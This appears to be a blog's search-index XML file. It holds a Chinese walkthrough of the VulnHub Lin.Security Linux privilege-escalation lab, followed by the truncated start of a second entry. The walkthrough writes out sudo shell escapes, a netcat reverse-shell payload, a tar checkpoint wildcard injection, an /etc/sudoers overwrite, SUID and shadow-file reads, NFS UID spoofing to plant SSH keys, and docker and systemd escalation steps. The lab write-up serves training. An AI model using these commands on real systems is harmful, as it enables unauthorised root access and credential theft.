<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>提权知识学习-LIN.SECURITY靶场</title>
      <link href="/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/"/>
      <url>/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习Linux提权知识的靶场</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200224135548.png" alt></p><a id="more"></a><p>靶场地址：<a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/linsecurity-1,244/</a></p><p>低权限用户：<code>bob:secret</code></p><p>此靶场为<strong>Linux 配置问题导致提权</strong></p><h2 id="靶机设置"><a href="#靶机设置" class="headerlink" title="靶机设置"></a>靶机设置</h2><h3 id="修改默认键盘布局"><a href="#修改默认键盘布局" class="headerlink" title="修改默认键盘布局"></a>修改默认键盘布局</h3><p>该靶机的默认键盘布局不是美式的，敲击<code>|</code>会出现<code>~</code></p><p>首先运行命令：<code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code>（<code>&quot;</code>布局改变了，多试几个），<strong>提升为root用户</strong>，方便后面的修改配置文件。</p><p>修改配置文件：<code>sudo vim /etc/default/keyboard</code>，将里面的<code>XKBLAYOUT</code>变量的值改为<code>us</code>，然后在文字终端（ctrl+Alt+F2那种）运行：<code>setupcon</code></p><h3 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h3><p>Ubuntu 18通过<code>netplan</code>设置网络。</p><p>同上，先提权到root用户。</p><p><code>ifconfig -a</code>看到有一块<code>ens33</code>的网卡，但是没有生效。</p><p><code>sudo vim /etc/netplan/50-cloud-init.yaml</code>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221155727.png" alt></p><p>将<code>enp0s3</code>改为<code>ens33</code>，<code>sudo netplan apply</code>重启网络</p><h2 id="简单信息搜集"><a href="#简单信息搜集" class="headerlink" title="简单信息搜集"></a>简单信息搜集</h2><h3 id="检测当前用户权限"><a href="#检测当前用户权限" class="headerlink" title="检测当前用户权限"></a>检测当前用户权限</h3><p><code>whoami</code>  <code>id</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210332.png" alt></p><h3 id="查看系统的发行版本和内核版本"><a href="#查看系统的发行版本和内核版本" class="headerlink" title="查看系统的发行版本和内核版本"></a>查看系统的发行版本和内核版本</h3><p><code>lsb_release -a</code></p><p><code>uname -a</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210411.png" alt></p><h3 id="查看运行的服务及安装的程序"><a href="#查看运行的服务及安装的程序" class="headerlink" title="查看运行的服务及安装的程序"></a>查看运行的服务及安装的程序</h3><h2 id="1-sudo-提权"><a href="#1-sudo-提权" class="headerlink" title="1. sudo  提权"></a>1. sudo  提权</h2><p><strong>关于sudo命令</strong>：</p><p>sudo权限是root把本来只能超级用户执行的命令<strong>赋予普通用户执行</strong></p><p>要配置sudo，具体是修改<code>/etc/sudoers</code></p><p><strong>提权姿势</strong>：</p><p>采用<code>sudo -l</code>这个命令来<strong>查看自己是否有sudo配置</strong></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213139.png" alt></p><p>拥有sudo的<code>ash</code>、<code>awk</code>等权限</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213232.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213332.png" alt></p><p><code>find</code>命令也可提权：<code>find . -exec /bin/sh \; -quit</code></p><p><strong>在线查询sudo的提权命令</strong>：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><h2 id="2-etc-passwd的哈希"><a href="#2-etc-passwd的哈希" class="headerlink" title="2. /etc/passwd的哈希"></a>2. /etc/passwd的哈希</h2><p>linux的用户密码哈希存储在<code>/etc/shadow</code>文件，<strong>普通用户</strong>能够查看到的则是<code>/etc/passwd</code>这个文件</p><p>在<code>/etc/passwd</code>中，比如：<code>root:x:0:0:root:/root:/bin/bash</code>。账户的<strong>第二列</strong>是密码哈希，如果该列为<code>x</code>则代表密码哈希存储在<code>/etc/shadow</code>文件上</p><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><strong>普通用户权限能够查看</strong></p><p>保存用户信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为七个部分</p><ol><li>用户名</li><li>密码，x表示密码保存在<code>/etc/shadow</code></li><li>UID，0代表root</li><li>GID，表示所在组</li><li>描述信息，依次为<code>Full Name</code>、<code>Room Number</code>、<code>Work Phone</code>、<code>Home Phone</code>和<code>Other</code></li><li>用户主目录</li><li>默认shell类型</li></ol><p><strong>eg.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash</span><br></pre></td></tr></table></figure><ul><li>用户名：test2</li><li>密码保存在<code>/etc/shadow</code></li><li>UID为<code>1001</code></li><li>GID为<code>1001</code></li><li>描述信息：<code>Full Name []: test2  Room Number []: 11111  Work Phone []: 111111-11  Home Phone []: 222222-22  Other []: test</code></li><li>用户主目录为<code>/home/test2</code></li><li>默认shell为<code>/bin/bash</code></li></ul><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><strong>只有root用户权限能够查看</strong></p><p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为九个部分</p><ol><li>用户名</li><li>加密后的密码</li><li>上次修改密码的时间(从1970.1.1开始的总天数)</li><li>两次修改密码间隔的最少天数，如果为0，则没有限制</li><li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</li><li>提前多少天警告用户密码将过期</li><li>在密码过期之后多少天禁用此用户</li><li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li><li>保留</li></ol><p><strong>注：</strong></p><p>参数说明可通过<code>man shadow</code>获取</p><p><strong>eg.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</span><br></pre></td></tr></table></figure><ul><li>用户名：test2</li><li>加密后的密码：<code>$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></li><li>上次修改密码的时间(从1970.1.1开始的总天数为17470)</li><li>两次修改密码间隔：没有限制</li><li>两次修改密码间隔最多的天数：没有限制</li><li>提前7天警告用户密码将过期</li><li>该用户永久可用</li></ul><p>由示例可知，<strong>加密的密码具有固定格式</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$salt$encrypted</span><br></pre></td></tr></table></figure><ul><li><p><code>id</code>表示<strong>加密算法</strong>，<code>1</code>代表<code>MD5</code>，<code>5</code>代表<code>SHA-256</code>，<code>6</code>代表<code>SHA-512</code></p></li><li><p><code>salt</code>为盐值,系统随机生成</p></li><li><p><code>encrypted</code>表示密码的<code>hash值</code></p></li></ul><h3 id="靶机提权演示"><a href="#靶机提权演示" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>/etc/passwd</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142135.png" alt></p><p><code>insecurity</code>用户，<code>uid</code>和<code>gid</code>均为0（root），并且已经显示了密码的hash。</p><p><code>cmd5</code>尝试破解：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142248.png" alt></p><p>收费，试试<code>somd5</code>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142310.png" alt></p><p>进行提权：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142540.png" alt></p><h3 id="破解用户密码hash的常用工具和方法"><a href="#破解用户密码hash的常用工具和方法" class="headerlink" title="破解用户密码hash的常用工具和方法"></a>破解用户密码hash的常用工具和方法</h3><h4 id="在线网站查询"><a href="#在线网站查询" class="headerlink" title="在线网站查询"></a>在线网站查询</h4><p><a href="https://cmd5.com" target="_blank" rel="noopener">https://cmd5.com</a></p><p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><strong>John the Ripper</strong> 和 <strong>hashcat</strong></p><p>Kali2.0集成了<code>John the Ripper</code>和<code>hashcat</code></p><p><a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-john/</a></p><p><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a></p><p><strong>mimipenguin</strong></p><p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>原理类似于<code>mimikatz</code>，通过内存导出明文密码</p><h2 id="3-利用定时任务cron以及通配符"><a href="#3-利用定时任务cron以及通配符" class="headerlink" title="3. 利用定时任务cron以及通配符"></a>3. 利用定时任务cron以及通配符</h2><p><strong>crontab文件格式</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式 :</span><br><span class="line"> *　　*　　*　　*　　*　　command</span><br><span class="line"> 分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure><p>第1列表示分钟1～59 每分钟用<code>*</code>或者 <code>*/1</code>表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p><p><strong>eg</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的21:30重启apache。</span><br><span class="line"></span><br><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月1、10、22日的4 : 45重启apache。</span><br><span class="line"></span><br><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的1 : 10重启apache。</span><br></pre></td></tr></table></figure><p>查看/etc/crontab的定时任务会<strong>产生一些有趣的结果</strong></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221144805.png" alt></p><p>查看<code>/etc/cron.daily/backup</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221165016.png" alt></p><p>这个定时任务的执行权限是root，将用户家目录下的文件备份到<code>/etc/backups/</code>下，<strong>使用通配符<code>*</code></strong></p><p>利用通配符进行Linux本地提权：<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80943097</a></p><p><strong>反弹shell</strong>：</p><p>使用<code>msfvenom</code>生成<strong>nc反弹shell一句话</strong>（直接print到终端）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R</span><br></pre></td></tr></table></figure><ul><li><code>-p</code>：payload</li><li><code>R</code>：RAWAW原始数据</li></ul><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170056.png" alt></p><p>将次payload写入<code>shell.sh</code>，并赋予执行权限：（在<strong>tar处理的目录下</strong>写入shell.sh）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&amp;1; rm /tmp/jvenbd&quot; &gt; shell.sh &amp;&amp; chmod +x shell.sh</span><br></pre></td></tr></table></figure><p>再创建两个文件：<code>--checkpoint-action=exec=sh shell.sh</code> 和 <code>--checkpoint=1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">echo &gt; &quot;--checkpoint=1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170528.png" alt></p><p>接着<code>nc -lp 8888 -vv</code>开启本地监听，等待定时任务的反弹连接：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170933.png" alt></p><p>实际上，<strong>定时任务执行的命令</strong>为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /etc/backups/home-bob.tgz *</span><br><span class="line">|</span><br><span class="line">|-&gt;</span><br><span class="line">tar -zcf /etc/backups/home-bob.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh</span><br></pre></td></tr></table></figure><ul><li><code>--checkpoint-action</code>选项：用于指定<strong>到达检查点时将要执行的程序</strong>，这将允许我们运行一个任意的命令。</li></ul><p>因此，选项<code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh shell.sh</code><strong>作为命令行选项</strong>交给了tar程序。</p><p><strong>直接修改<code>/etc/sudoers</code>文件</strong>：</p><p><code>echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;shell.sh</code></p><h2 id="4-利用隐藏文件"><a href="#4-利用隐藏文件" class="headerlink" title="4. 利用隐藏文件"></a>4. 利用隐藏文件</h2><p>有时候<strong>隐藏文件</strong>会存放一些重要的信息，比如我们<strong>搜索home目录下的所有隐藏文件</strong>，并用ls -al显示出来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name ".*" -type f -path "/home/*" -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>-ipath p</code>, <code>-path p</code>：<strong>路径名称符合 p</strong> 的文件，ipath 会忽略大小写</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174037.png" alt></p><p>查看该文件，是susan用户的密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174144.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174234.png" alt></p><h2 id="5-利用SUID"><a href="#5-利用SUID" class="headerlink" title="5. 利用SUID"></a>5. 利用SUID</h2><p>SUID这个是<code>uid +s</code>的组合，s指的是<strong>特殊权限</strong>。一般情况下，用户的权限是3位，比如<code>0755</code>这样的，<strong>特殊权限默认没有配置</strong>，但是如果超级管理员<strong>希望用户在执行一些特殊权限文件时，拥有root的权限</strong>，就会配置特殊权限。</p><p>比如说<code>passwd</code>这个命令，这个命令会修改<code>/etc/shadow</code>文件，而<code>/etc/shadow</code><strong>只有root才能修改</strong>，本来passwd这个命令应该也只能root才能执行的。但是<strong>系统为了让普通用户能够修改自己的密码</strong>，对<code>passwd</code>这个命令<strong>赋予了特殊权限</strong>并添加了只能修改自己密码的限制。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003056.png" alt></p><p>由于<code>passwd</code>这个命令是<strong>做过限制</strong>的，所以<strong>赋予特殊权限是没有问题</strong>的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。</p><p><strong>使用如下命令快速查找所有SUID文件</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003224.png" alt></p><p>命令文件，<code>xxd</code>的作用是<strong>将一个文件以16进制的形式显示出来</strong>。他<strong>被配置了特殊权限</strong>，并且用户组为<code>itservices</code>是拥有执行权限x的。</p><p>一旦<strong>suid</strong>和<strong>执行权限</strong>在一起就可能导致权限提升！</p><p>通过命令查看发现<code>susan</code>这个用户属于<code>itservices</code>这个用户组。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003500.png" alt></p><p>用它来查看<code>/etc/shadow</code>这个文件，更多利用方法可以参考<a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/xxd/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003704.png" alt></p><p>还发现了一个<strong>其他用户拥有执行权限</strong>的SUID文件，这个文件<strong>不限用户</strong>，所以危害更大。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003834.png" alt></p><p>参考<a href="https://gtfobins.github.io/gtfobins/taskset/#suid-enabled" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/taskset/#suid-enabled</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003953.png" alt></p><h2 id="6-NFS低权限访问"><a href="#6-NFS低权限访问" class="headerlink" title="6. NFS低权限访问"></a>6. NFS低权限访问</h2><p>用<code>nmap</code>扫一下目标靶机，看看开放的服务：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222120320.png" alt></p><p>看到开放<code>2049</code>端口，对应<code>nfs</code>服务。</p><p>NFS(<code>Network File System</code>)即<strong>网络文件系统</strong>，它<strong>允许网络中的计算机之间通过TCP/IP网络共享资源</strong>。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p><p>在kali上<strong>安装nfs客户端工具</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure><p>安装完之后，可以使用<code>showmount</code>命令检索<strong>给定主机的导出文件夹列表</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143147.png" alt></p><p>账号peter的家目录可以被挂载：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143216.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143235.png" alt></p><p>可以看到，挂载好的peter的家目录，显示的文件的<strong>所有者</strong>和<strong>所属组</strong>分别为<code>1001</code>和<code>1005</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143654.png" alt></p><p>尝试在这个家目录里面<strong>创建一个文件</strong>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143950.png" alt></p><p>权限不够。</p><p>即使我们在kali攻击机上是root用户，但是我们还是没有写入权限，因为<strong>默认情况下客户端的root身份会被主动压缩成匿名者</strong>。</p><p><strong>可以伪造文件所有者的UID和GID来欺骗NFS服务器</strong>，创建一个gid为1005的用户组，接着创建peter这个账户uid指定为1001，gid指定为1005。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144218.png" alt></p><p>再看看<code>/mnt/peter</code>下的文件所有者：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144321.png" alt></p><p>但现在还是以客户端的root登录，服务端默认为匿名者。</p><p>切换客户端用户为<code>peter</code>，服务端也认为是存在的用户<code>peter</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144513.png" alt></p><p>可以写文件了，如此，可以<strong>写入ssh公钥文件</strong>（先使用<code>ssh-keygen</code>生成公私钥对）：</p><p>首先创建服务器上的<code>.ssh</code>目录，写入公钥：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144739.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145125.png" alt></p><p>使用私钥登录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145227.png" alt></p><h2 id="7-利用docker组提权"><a href="#7-利用docker组提权" class="headerlink" title="7. 利用docker组提权"></a>7. 利用docker组提权</h2><p>从上面那张图，看到<code>peter用户</code>也属于<code>docker组</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222150634.png" alt></p><p>如果是docker组的成员，那么可以根据此漏洞来<strong>获取root的shell</strong></p><p>具体参考：<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure><p>可以先配置使用阿里云的镜像</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222151859.png" alt></p><p>镜像的具体代码可以查看：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p><h2 id="8-systemd配置"><a href="#8-systemd配置" class="headerlink" title="8. systemd配置"></a>8. systemd配置</h2><h3 id="systemd是什么"><a href="#systemd是什么" class="headerlink" title="systemd是什么"></a>systemd是什么</h3><p>历史上，<a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="noopener">Linux 的启动</a>一直采用<a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener"><code>init</code></a>进程。</p><p>下面的命令用来启动服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/apache2 start</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ service apache2 start</span><br></pre></td></tr></table></figure><p>这种方法有两个缺点。</p><p>一是启动时间长。<code>init</code>进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p><p>二是启动脚本复杂。<code>init</code>进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</p><p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是，<strong>为系统的启动和管理提供一套完整的解决方案</strong>。</p><p>使用了 <code>Systemd</code>，就不需要再用<code>init</code>了。<code>Systemd</code> 取代了<code>initd</code>，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 并不是一个命令，而是<strong>一组命令</strong>，涉及到<strong>系统管理的方方面面</strong>。</p><ul><li><p><code>systemctl</code>是 Systemd 的主命令，用于管理系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭系统，切断电源</span></span><br><span class="line">$ sudo systemctl poweroff</span><br></pre></td></tr></table></figure></li><li><p><code>systemd-analyze</code>命令用于查看启动耗时。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看启动耗时</span></span><br><span class="line">$ systemd-analyze                                                                     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看每个服务的启动耗时</span></span><br><span class="line">$ systemd-analyze blame</span><br></pre></td></tr></table></figure></li><li><p><code>hostnamectl</code>命令用于查看当前主机的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前主机的信息</span></span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机名。</span></span><br><span class="line">$ sudo hostnamectl <span class="built_in">set</span>-hostname rhel7</span><br></pre></td></tr></table></figure></li></ul><h3 id="靶机提权演示-1"><a href="#靶机提权演示-1" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>peter</code>用户的<code>systemd</code>配置，发现<code>peter</code>这个用户拥有<code>debug.service</code>文件，并且他<strong>对这个文件拥有读和写的权限</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222154157.png" alt></p><p>如果服务器存在缺陷，<strong>可以被覆盖或者修改文件</strong>，可以通过<strong>修改低权限用户有权访问的<code>.service</code>文件并更改<code>run()</code>命令来将其转换为代码执行</strong>。重新启动服务时，将运行攻击者的命令。</p><p>查看<code>.service</code>文件，这里我们可以修改<code>ExecStart</code>文件，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来在<strong>停止</strong>和<strong>重启</strong>服务时执行命令。</p><p>查看该<code>.service</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222155806.png" alt></p><p><code>ExecStart</code>为<code>/root/debug</code>，这是一个<strong>二进制服务</strong>并且该服务<strong>以root身份运行</strong>。</p><p>接下来为了利用，使用一个<strong>类似ssh可以sudo执行的方法</strong>。</p><p><strong>让root身份来创建一个systemdexpl.sh脚本</strong>，将<code>/bin/bash</code>文件<strong>复制到</strong><code>systemdbash</code><strong>并设置一个SUID位</strong>并且赋予执行权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure><p><code>-e</code>参数为显示换行。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160028.png" alt></p><p>修改<code>debug.service</code>文件来调用我们的脚本（记住<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>）修改<code>ExecStart</code>为当前脚本。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160305.png" alt></p><p>而要调用这个服务并且启动，就是<strong>重新开启会话（可能重启系统）</strong>，<strong>利用SUID来进行提权</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160857.png" alt></p><p>利用<code>SUID</code>提权：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222161005.png" alt></p><p>同理，<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>，我们可以将<code>systemdexpl.sh</code>的内容修改为将公钥写入<code>/root/.ssh</code>下：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162107.png" alt></p><p>直接以<code>root</code>用户登录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162207.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 提权知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集总结</title>
      <link href="/passages/2020-02-12-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%BB%E7%BB%93/"/>
      <url>/passages/2020-02-12-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%BB%E7%BB%93/</url>
      
